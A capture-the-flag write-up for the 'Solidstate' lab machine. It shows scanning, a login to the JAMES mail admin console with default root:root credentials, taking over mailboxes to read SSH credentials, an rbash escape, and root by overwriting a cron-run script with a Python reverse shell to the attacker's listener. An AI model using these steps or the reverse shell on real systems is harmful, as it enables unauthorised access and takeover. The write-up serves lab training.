## Solidstate


| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.51 |
|Difficulty |    Medium   |

## Scanning

### Nmap scanning

```bash
$ nmap -sC -sV  -oN nmap/solidstate -Pn  10.10.10.51
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 13:43 EDT
Nmap scan report for 10.10.10.51
Host is up (0.097s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.40 seconds

```


- Full nmap scan

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|_  256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.232 [10.10.14.232]), 
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```


## Enumeration

- Connect to port `4555`

```
$ nc 10.10.10.51 4555
```

```bash
$ nc 10.10.10.51 4555                               
admin

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword mailadmin password
Password for mailadmin reset
setpassword mindy password
Password for mindy reset
```

- able to login with `root:root` and change `mindy` password to `password`, change this to all users.








- Telnet to `110` and retreive emails of each user

- one user's email that stands out is `mindy`

```bash
$ telnet 10.10.10.51 110                            
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

## Exploitation


- ssh to user `mindy`
- after login we see that we are in `rbash`
```bash
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cd ..
-rbash: cd: restricted

```

- use `bash --noprofile` to escape `rbash`


```bash
$ ssh mindy@10.10.10.51 'bash --noprofile'                                              1 ⨯
mindy@10.10.10.51's password: 
cd ..
ls
james
mindy
```


## Privilege escalation

- on running `linpeas`, found a file owned by root and writable by our our user `mindy`

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ls -la /opt/tmp.py
ls -la /opt/tmp.py
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ cat /opt/tmp.py
cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
- likely a cron job, we can replace the contents with our shell and wait for it.

- using `cat` to replace file contents (`vi` does'nt seem to work)


```bash
mindy@solidstate:/opt$ cat <<-EOF > /opt/tmp.py
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.12",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

EOF
```


```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat /opt/tmp.py
cat /opt/tmp.py
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.12",9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la /opt/tmp.py
ls -la /opt/tmp.py
-rwxrwxrwx 1 root root 228 Sep 15 14:40 /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ 
```


__Result__

```bash
─$ nc -lvnp  9001                                    
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.51] 47562
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 

```